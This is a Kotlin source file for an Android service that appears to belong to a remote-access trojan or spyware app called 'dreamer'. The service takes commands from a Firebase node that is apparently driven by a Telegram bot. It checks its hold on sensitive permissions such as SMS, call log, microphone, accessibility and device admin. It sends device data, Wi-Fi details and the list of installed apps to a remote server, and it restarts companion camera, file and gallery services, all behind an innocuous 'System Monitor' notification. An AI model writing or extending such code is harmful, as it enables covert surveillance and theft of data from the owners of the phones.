package com.h4k3r.dreamer

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.google.gson.Gson
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody

class PermissionMonitorService : Service() {
    companion object {
        private const val TAG = "PermissionMonitor"
    }

    /* ── Authentication ─────────────────────────── */
    private lateinit var secretKey: String
    private lateinit var deviceId: String
    private lateinit var deviceRef: DatabaseReference

    /* ── HTTP & Coroutines ──────────────────────── */
    private val server = "https://dreamer-bot.onrender.com"
    private val http = OkHttpClient()
    private val gson = Gson()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    /* ── Permission List ────────────────────────── */
    private val permissionsToCheck = mapOf(
        "camera" to Manifest.permission.CAMERA,
        "location_fine" to Manifest.permission.ACCESS_FINE_LOCATION,
        "location_coarse" to Manifest.permission.ACCESS_COARSE_LOCATION,
        "contacts" to Manifest.permission.READ_CONTACTS,
        "sms" to Manifest.permission.READ_SMS,
        "phone" to Manifest.permission.READ_PHONE_STATE,
        "microphone" to Manifest.permission.RECORD_AUDIO,
        "call_log" to Manifest.permission.READ_CALL_LOG,
        "calendar" to Manifest.permission.READ_CALENDAR,
        "storage_read" to if (Build.VERSION.SDK_INT >= 33) {
            Manifest.permission.READ_MEDIA_IMAGES
        } else {
            Manifest.permission.READ_EXTERNAL_STORAGE
        },
        "storage_write" to if (Build.VERSION.SDK_INT < 30) {
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        } else {
            null // Not needed on Android 11+
        },
        "notifications" to if (Build.VERSION.SDK_INT >= 33) {
            Manifest.permission.POST_NOTIFICATIONS
        } else {
            null
        }
    )

    override fun onCreate() {
        super.onCreate()

        // Load authentication
        val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
        secretKey = prefs.getString("secret_key", "") ?: ""
        deviceId = prefs.getString("device_id", "") ?: ""

        if (secretKey.isEmpty() || deviceId.isEmpty()) {
            Log.e(TAG, "Missing authentication")
            stopSelf()
            return
        }

        Log.d(TAG, "Service started - Key: ${secretKey.take(6)}..., Device: $deviceId")

        startForegroundNotification()

        // Initialize Firebase reference
        deviceRef = Firebase.database.reference
            .child("devices")
            .child(secretKey)
            .child(deviceId)

        listenFirebase()

        // Check permissions periodically
        startPeriodicPermissionCheck()
    }

    private fun listenFirebase() {
        deviceRef.child("command").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val cmd = snapshot.getValue(String::class.java) ?: return
                val chatId = snapshot.child("chat")?.getValue(Long::class.java) ?: 0L
                val msgId = snapshot.child("msg")?.getValue(Long::class.java) ?: 0L

                Log.d(TAG, "Command: $cmd")

                when (cmd) {
                    "check_permissions" -> checkAndSendPermissions(chatId, msgId)
                    "battery_status" -> sendBatteryStatus(chatId, msgId)
                    "network_info" -> sendNetworkInfo(chatId, msgId)
                    "app_list" -> sendAppList(chatId, msgId)
                    "restart_services" -> restartAllServices(chatId)
                }

                snapshot.ref.setValue(null)
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Firebase error", error.toException())
            }
        })
    }

    /* ── Check and Send Permissions ─────────────── */
    private fun checkAndSendPermissions(chatId: Long, msgId: Long) {
        Log.d(TAG, "Checking permissions")

        val permissions = mutableMapOf<String, Boolean>()

        // Check regular permissions
        permissionsToCheck.forEach { (name, permission) ->
            if (permission != null) {
                permissions[name] = ContextCompat.checkSelfPermission(this, permission) ==
                        PackageManager.PERMISSION_GRANTED
            }
        }

        // Check special permissions
        permissions["all_files_access"] = if (Build.VERSION.SDK_INT >= 30) {
            Environment.isExternalStorageManager()
        } else {
            true
        }

        // Check if we can draw over other apps
        permissions["overlay"] = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            android.provider.Settings.canDrawOverlays(this)
        } else {
            true
        }

        // Check if we're device admin
        val devicePolicyManager = getSystemService(android.app.admin.DevicePolicyManager::class.java)
        val adminComponent = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
        permissions["device_admin"] = devicePolicyManager?.isAdminActive(adminComponent) ?: false

        // Check accessibility service
        permissions["accessibility"] = isAccessibilityServiceEnabled()

        // Check notification access
        permissions["notification_listener"] = isNotificationListenerEnabled()

        // Send to server
        val json = gson.toJson(mapOf(
            "chat_id" to chatId,
            "msg_id" to msgId,
            "permissions" to permissions
        ))

        postJson("/json/permissions", json)
    }

    /* ── Send Battery Status ────────────────────── */
    private fun sendBatteryStatus(chatId: Long, msgId: Long) {
        val batteryIntent = registerReceiver(
            null,
            android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        )

        val level = batteryIntent?.getIntExtra("level", -1) ?: -1
        val scale = batteryIntent?.getIntExtra("scale", -1) ?: -1
        val status = batteryIntent?.getIntExtra("status", -1) ?: -1
        val plugged = batteryIntent?.getIntExtra("plugged", -1) ?: -1
        val temperature = batteryIntent?.getIntExtra("temperature", -1) ?: -1
        val voltage = batteryIntent?.getIntExtra("voltage", -1) ?: -1

        val percentage = if (level != -1 && scale != -1) {
            (level * 100 / scale)
        } else {
            -1
        }

        val chargingStatus = when (status) {
            android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "Charging"
            android.os.BatteryManager.BATTERY_STATUS_DISCHARGING -> "Discharging"
            android.os.BatteryManager.BATTERY_STATUS_FULL -> "Full"
            android.os.BatteryManager.BATTERY_STATUS_NOT_CHARGING -> "Not Charging"
            else -> "Unknown"
        }

        val powerSource = when (plugged) {
            android.os.BatteryManager.BATTERY_PLUGGED_AC -> "AC"
            android.os.BatteryManager.BATTERY_PLUGGED_USB -> "USB"
            android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
            else -> "None"
        }

        val json = gson.toJson(mapOf(
            "chat_id" to chatId,
            "msg_id" to msgId,
            "type" to "battery_status",
            "battery" to mapOf(
                "percentage" to percentage,
                "status" to chargingStatus,
                "power_source" to powerSource,
                "temperature" to "${temperature / 10.0}°C",
                "voltage" to "${voltage / 1000.0}V"
            )
        ))

        postJson("/json/device_status", json)
    }

    /* ── Send Network Info ──────────────────────── */
    private fun sendNetworkInfo(chatId: Long, msgId: Long) {
        val connectivityManager = getSystemService(android.net.ConnectivityManager::class.java)
        val networkInfo = connectivityManager?.activeNetworkInfo
        val wifiManager = applicationContext.getSystemService(android.net.wifi.WifiManager::class.java)

        val networkType = networkInfo?.typeName ?: "None"
        val isConnected = networkInfo?.isConnected ?: false

        val wifiInfo = if (networkType == "WIFI" && wifiManager != null) {
            val info = wifiManager.connectionInfo
            mapOf(
                "ssid" to info.ssid.replace("\"", ""),
                "signal_strength" to "${android.net.wifi.WifiManager.calculateSignalLevel(info.rssi, 100)}%",
                "link_speed" to "${info.linkSpeed} Mbps",
                "ip_address" to intToIp(info.ipAddress)
            )
        } else null

        val json = gson.toJson(mapOf(
            "chat_id" to chatId,
            "msg_id" to msgId,
            "type" to "network_info",
            "network" to mapOf(
                "connected" to isConnected,
                "type" to networkType,
                "wifi" to wifiInfo
            )
        ))

        postJson("/json/device_status", json)
    }

    /* ── Send App List ──────────────────────────── */
    private fun sendAppList(chatId: Long, msgId: Long) {
        scope.launch {
            try {
                val pm = packageManager
                val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)

                val apps = packages.map { app ->
                    mapOf(
                        "name" to (pm.getApplicationLabel(app).toString()),
                        "package" to app.packageName,
                        "system" to ((app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0)
                    )
                }.sortedBy { it["name"] as String }

                val json = gson.toJson(mapOf(
                    "chat_id" to chatId,
                    "msg_id" to msgId,
                    "type" to "app_list",
                    "total" to apps.size,
                    "apps" to apps.take(100) // Limit to first 100 apps
                ))

                postJson("/json/device_status", json)
            } catch (e: Exception) {
                Log.e(TAG, "App list error", e)
            }
        }
    }

    /* ── Restart All Services ───────────────────── */
    private fun restartAllServices(chatId: Long) {
        val services = listOf(
            CameraService::class.java,
            DataService::class.java,
            FilesService::class.java,
            GalleryService::class.java
        )

        services.forEach { serviceClass ->
            val intent = Intent(this, serviceClass)
            stopService(intent)
            ContextCompat.startForegroundService(this, intent)
        }

        val json = gson.toJson(mapOf(
            "chat_id" to chatId,
            "type" to "service_restart",
            "message" to "All services have been restarted",
            "device" to deviceId
        ))

        postJson("/json/status", json)
    }

    /* ── Periodic Permission Check ──────────────── */
    private fun startPeriodicPermissionCheck() {
        scope.launch {
            while (isActive) {
                delay(6 * 60 * 60 * 1000) // Every 6 hours
                updatePermissionsInFirebase()
            }
        }
    }

    private fun updatePermissionsInFirebase() {
        val permissions = mutableMapOf<String, Boolean>()

        permissionsToCheck.forEach { (name, permission) ->
            if (permission != null) {
                permissions[name] = ContextCompat.checkSelfPermission(this, permission) ==
                        PackageManager.PERMISSION_GRANTED
            }
        }

        deviceRef.child("info").child("permissions").setValue(permissions)
    }

    /* ── Helper Functions ───────────────────────── */
    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = android.provider.Settings.Secure.getString(
            contentResolver,
            android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        return enabledServices.contains(packageName)
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val enabledListeners = android.provider.Settings.Secure.getString(
            contentResolver,
            "enabled_notification_listeners"
        ) ?: return false

        return enabledListeners.contains(packageName)
    }

    private fun intToIp(i: Int): String {
        return "${i and 0xff}.${i shr 8 and 0xff}.${i shr 16 and 0xff}.${i shr 24 and 0xff}"
    }

    private fun postJson(path: String, json: String) = scope.launch {
        try {
            val request = Request.Builder()
                .url(server + path)
                .header("X-Auth", "$secretKey:$deviceId")
                .post(json.toRequestBody("application/json".toMediaType()))
                .build()

            http.newCall(request).execute().use { response ->
                Log.d(TAG, "POST $path: ${response.code}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Network error", e)
        }
    }

    /* ── Service Lifecycle ──────────────────────── */
    private fun startForegroundNotification() {
        val channelId = "permission_monitor"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            getSystemService(NotificationManager::class.java)
                .createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        "Permission Monitor",
                        NotificationManager.IMPORTANCE_MIN
                    )
                )
        }

        startForeground(5, NotificationCompat.Builder(this, channelId)
            .setSmallIcon(android.R.drawable.ic_menu_preferences)
            .setContentTitle("System Monitor Active")
            .setContentText("Device: ${deviceId.take(6)}")
            .build()
        )
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}